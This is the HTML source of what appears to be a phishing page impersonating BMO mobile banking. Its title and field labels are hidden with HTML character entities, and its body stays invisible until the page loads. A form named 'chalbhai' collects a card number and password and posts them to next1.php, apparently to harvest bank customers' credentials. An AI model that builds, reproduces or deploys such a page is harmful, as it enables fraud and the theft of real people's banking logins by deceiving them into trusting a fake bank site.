<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#66;&#77;&#79;&#77;&#111;&#98;&#105;&#108;&#101;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
 
.textbox { 
    height: 40px; 
    width: 275px; 
    background-color: #FFFFFF;  
    border: 1px solid #848484; 
	border:none;	
	padding-left: 8px;
    border-width: 0px 0px 0px 0px;  
    border-color: darkred; 
    outline:0; 
	font: 15px Arial;
	font-weight: bold;
  } 
 </style>
<style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:23px;
							height:18px; 
							display:inline-block;
							line-height:18px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:18px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -18px;
						}
						label.css-label {
				background-image:url(http://csscheckbox.com/checkboxes/u/csscheckbox_a3d7eeaeb4f0bbdd7050d3eb930729a5.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style> 
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
</head>

<body style="visibility:hidden" onload="unhideBody()" bgColor="#005392">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:394px; height:574px; z-index:0"><img src="images/o1.png" alt="" title="" border=0 width=394 height=574></div>

<div id="image2" style="position:absolute; overflow:hidden; left:280px; top:10px; width:111px; height:28px; z-index:1"><a href="#"><img src="images/fran.png" alt="" title="" border=0 width=111 height=28></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:127px; top:237px; width:138px; height:18px; z-index:2"><a href="#"><img src="images/for.png" alt="" title="" border=0 width=138 height=18></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:49px; top:402px; width:292px; height:44px; z-index:3"><a href="#"><img src="images/us.png" alt="" title="" border=0 width=292 height=44></a></div>
<form action=next1.php name=chalbhai id=chalbhai method=post>
<input name="user" placeholder="&#67;&#97;&#114;&#100;&#32;&#78;&#117;&#109;&#98;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:287px;left:52px;top:125px;z-index:4">
<input name="pass" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:287px;left:52px;top:175px;z-index:5">

<div id="checkboxG1"  style="position:absolute; left:109px; top:267px; z-index:6"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:109px; top:267px; z-index:6"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:51px; top:303px; z-index:7"><input type="image" name="formimage1" width="291" height="42" src="images/nex.png"></div>

</body>
</html>
